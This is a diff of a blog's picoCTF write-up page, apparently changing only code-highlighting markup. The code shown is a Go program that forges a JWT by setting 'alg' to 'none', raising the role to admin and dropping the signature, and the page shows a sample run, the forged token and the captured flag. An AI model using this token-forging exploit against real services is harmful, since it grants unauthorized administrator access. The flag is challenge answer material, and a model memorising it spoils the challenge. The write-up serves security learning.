@@ -27,41 +27,41 @@ The trailing dot following the encoded payload must be present.</p><p>So, I wrot
 </span></span><span style=display:flex><span> <span style=color:#e6db74>&#34;strings&#34;</span>
 </span></span><span style=display:flex><span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#75715e>// modify decodes a base64 encoded part of the token,
-</span></span></span><span style=display:flex><span><span style=color:#75715e>// and sets the `whence` field to the value supplied as `what`
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>modify</span>(<span style=color:#a6e22e>part</span>, <span style=color:#a6e22e>whence</span>, <span style=color:#a6e22e>what</span> <span style=color:#66d9ef>string</span>) (<span style=color:#66d9ef>string</span>, <span style=color:#66d9ef>error</span>) {
-</span></span><span style=display:flex><span> <span style=color:#75715e>// b has the base64 decoded bytes
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span> <span style=color:#a6e22e>b</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>base64</span>.<span style=color:#a6e22e>URLEncoding</span>.<span style=color:#a6e22e>DecodeString</span>(<span style=color:#a6e22e>part</span>)
+</span></span><span style=display:flex><span><span style=color:#75715e>// modify decodes a base64 encoded part of the token,</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// and sets the `whence` field to the value supplied as `what`</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>modify</span>(<span style=color:#a6e22e>part</span>, <span style=color:#a6e22e>whence</span>, <span style=color:#a6e22e>what</span> <span style=color:#66d9ef>string</span>) (<span style=color:#66d9ef>string</span>, <span style=color:#66d9ef>error</span>) {
+</span></span><span style=display:flex><span> <span style=color:#75715e>// b has the base64 decoded bytes</span>
+</span></span><span style=display:flex><span> <span style=color:#a6e22e>b</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>base64</span>.<span style=color:#a6e22e>URLEncoding</span>.<span style=color:#a6e22e>DecodeString</span>(<span style=color:#a6e22e>part</span>)
 </span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#a6e22e>err</span>
 </span></span><span style=display:flex><span> }
-</span></span><span style=display:flex><span> <span style=color:#75715e>// unmarshal the json data to the structure `p`
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span> <span style=color:#a6e22e>p</span> <span style=color:#f92672>:=</span> make(<span style=color:#66d9ef>map</span>[<span style=color:#66d9ef>string</span>]<span style=color:#66d9ef>interface</span>{})
+</span></span><span style=display:flex><span> <span style=color:#75715e>// unmarshal the json data to the structure `p`</span>
+</span></span><span style=display:flex><span> <span style=color:#a6e22e>p</span> <span style=color:#f92672>:=</span> make(<span style=color:#66d9ef>map</span>[<span style=color:#66d9ef>string</span>]<span style=color:#66d9ef>interface</span>{})
 </span></span><span style=display:flex><span> <span style=color:#a6e22e>err</span> = <span style=color:#a6e22e>json</span>.<span style=color:#a6e22e>Unmarshal</span>(<span style=color:#a6e22e>b</span>, <span style=color:#f92672>&amp;</span><span style=color:#a6e22e>p</span>)
 </span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#a6e22e>err</span>
 </span></span><span style=display:flex><span> }
-</span></span><span style=display:flex><span> <span style=color:#75715e>// set the `whence` field to `what`
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span> <span style=color:#a6e22e>p</span>[<span style=color:#a6e22e>whence</span>] = <span style=color:#a6e22e>what</span>
-</span></span><span style=display:flex><span> <span style=color:#75715e>// marshal the modified structure back to json
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span> <span style=color:#a6e22e>marshalled</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>json</span>.<span style=color:#a6e22e>Marshal</span>(<span style=color:#a6e22e>p</span>)
+</span></span><span style=display:flex><span> <span style=color:#75715e>// set the `whence` field to `what`</span>
+</span></span><span style=display:flex><span> <span style=color:#a6e22e>p</span>[<span style=color:#a6e22e>whence</span>] = <span style=color:#a6e22e>what</span>
+</span></span><span style=display:flex><span> <span style=color:#75715e>// marshal the modified structure back to json</span>
+</span></span><span style=display:flex><span> <span style=color:#a6e22e>marshalled</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>json</span>.<span style=color:#a6e22e>Marshal</span>(<span style=color:#a6e22e>p</span>)
 </span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#a6e22e>err</span>
 </span></span><span style=display:flex><span> }
-</span></span><span style=display:flex><span> <span style=color:#75715e>// return the modified part, encoded with base64
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span> <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Replace</span>(<span style=color:#a6e22e>base64</span>.<span style=color:#a6e22e>URLEncoding</span>.<span style=color:#a6e22e>EncodeToString</span>(<span style=color:#a6e22e>marshalled</span>), <span style=color:#e6db74>&#34;=&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>), <span style=color:#66d9ef>nil</span>
+</span></span><span style=display:flex><span> <span style=color:#75715e>// return the modified part, encoded with base64</span>
+</span></span><span style=display:flex><span> <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Replace</span>(<span style=color:#a6e22e>base64</span>.<span style=color:#a6e22e>URLEncoding</span>.<span style=color:#a6e22e>EncodeToString</span>(<span style=color:#a6e22e>marshalled</span>), <span style=color:#e6db74>&#34;=&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>), <span style=color:#66d9ef>nil</span>
 </span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>main</span>() {
-</span></span><span style=display:flex><span> <span style=color:#75715e>// print usage if token is not supplied
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span> <span style=color:#66d9ef>if</span> len(<span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>Args</span>) &lt; <span style=color:#ae81ff>2</span> {
+</span></span><span style=display:flex><span> <span style=color:#75715e>// print usage if token is not supplied</span>
+</span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span> len(<span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>Args</span>) &lt; <span style=color:#ae81ff>2</span> {
 </span></span><span style=display:flex><span>  <span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Fprintf</span>(<span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>Stderr</span>, <span style=color:#e6db74>&#34;Usage:\n\t%s &lt;token&gt;\n&#34;</span>, <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>Args</span>[<span style=color:#ae81ff>0</span>])
 </span></span><span style=display:flex><span>  <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>Exit</span>(<span style=color:#ae81ff>1</span>)
 </span></span><span style=display:flex><span> }
-</span></span><span style=display:flex><span> <span style=color:#75715e>// split the parts
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span> <span style=color:#a6e22e>parts</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Split</span>(<span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>Args</span>[<span style=color:#ae81ff>1</span>], <span style=color:#e6db74>&#34;.&#34;</span>)
-</span></span><span style=display:flex><span> <span style=color:#75715e>// set the last part to empty since we would not need it
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span> <span style=color:#a6e22e>parts</span>[<span style=color:#ae81ff>2</span>] = <span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span> <span style=color:#75715e>// split the parts</span>
+</span></span><span style=display:flex><span> <span style=color:#a6e22e>parts</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Split</span>(<span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>Args</span>[<span style=color:#ae81ff>1</span>], <span style=color:#e6db74>&#34;.&#34;</span>)
+</span></span><span style=display:flex><span> <span style=color:#75715e>// set the last part to empty since we would not need it</span>
+</span></span><span style=display:flex><span> <span style=color:#a6e22e>parts</span>[<span style=color:#ae81ff>2</span>] = <span style=color:#e6db74>&#34;&#34;</span>
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span> <span style=color:#a6e22e>part</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>modify</span>(<span style=color:#a6e22e>parts</span>[<span style=color:#ae81ff>0</span>], <span style=color:#e6db74>&#34;alg&#34;</span>, <span style=color:#e6db74>&#34;none&#34;</span>)
 </span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
@@ -73,8 +73,8 @@ The trailing dot following the encoded payload must be present.</p><p>So, I wrot
 </span></span><span style=display:flex><span>  <span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Fatalln</span>(<span style=color:#a6e22e>err</span>)
 </span></span><span style=display:flex><span> }
 </span></span><span style=display:flex><span> <span style=color:#a6e22e>parts</span>[<span style=color:#ae81ff>1</span>] = <span style=color:#a6e22e>part</span>
-</span></span><span style=display:flex><span> <span style=color:#75715e>// join the parts back
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span> <span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Printf</span>(<span style=color:#e6db74>&#34;Forged token: %v\n&#34;</span>, <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Join</span>(<span style=color:#a6e22e>parts</span>, <span style=color:#e6db74>&#34;.&#34;</span>))
+</span></span><span style=display:flex><span> <span style=color:#75715e>// join the parts back</span>
+</span></span><span style=display:flex><span> <span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Printf</span>(<span style=color:#e6db74>&#34;Forged token: %v\n&#34;</span>, <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Join</span>(<span style=color:#a6e22e>parts</span>, <span style=color:#e6db74>&#34;.&#34;</span>))
 </span></span><span style=display:flex><span>}
 </span></span></code></pre></div><p>Now we run:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>go run main.go eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjQ1NTE4MjkzMTE5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85Ny4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NDU1MTgyOTN9.dy45xnUb62Xnhqgo51JmGWRthAUGS-3jKwQ_RlDYCrw
 </span></span></code></pre></div><p>which gives forged token: <code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85Ny4wIiwiYXV0aCI6MTY0NTUxODI5MzExOSwiaWF0IjoxNjQ1NTE4MjkzLCJyb2xlIjoiYWRtaW4ifQ.</code></p><p>Manually setting the cookie to this value, we are redirected to the admin page.</p><blockquote><p>Hello, admin! You have logged in as admin!</p></blockquote><p>and we are greeted with the flag <code>picoCTF{succ3ss_@u7h3nt1c@710n_57072644}</code></p></section></article><footer class=post-tags data-pagefind-meta=tags><a href=https://lavafroth.is-a.dev/tags/authentication-bypass class=list-tag>Authentication Bypass</a>
